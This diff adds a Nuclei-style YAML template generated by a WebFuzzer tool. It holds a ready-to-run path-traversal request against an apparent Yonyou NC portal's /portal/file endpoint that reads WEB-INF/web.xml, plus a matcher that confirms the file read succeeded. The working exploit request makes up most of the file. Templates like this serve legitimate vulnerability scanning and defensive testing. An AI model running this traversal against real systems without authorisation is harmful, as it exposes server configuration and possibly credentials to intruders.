@@ -1,0 +1,39 @@
+id: youyou-upa-file
+
+info:
+  name: WebFuzzer Template QZgLZbQd
+  author: god
+  severity: low
+  description: write your description here
+  metadata:
+    max-request: 1
+    shodan-query: ""
+    verified: true
+
+
+http:
+- raw:
+  - |+
+    @timeout: 30s
+    GET /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml HTTP/1.1
+    Host: {{Hostname}}
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Accept-Language: zh-CN,zh;q=0.9
+    Accept-Encoding: gzip, deflate
+    Connection: close
+
+
+  max-redirects: 3
+  matchers-condition: and
+  matchers:
+    - type: word
+      part: body
+      words:
+        - web-app
+
+
+ 
+
+# Generated From WebFuzzer on 2024-09-12 11:19:33
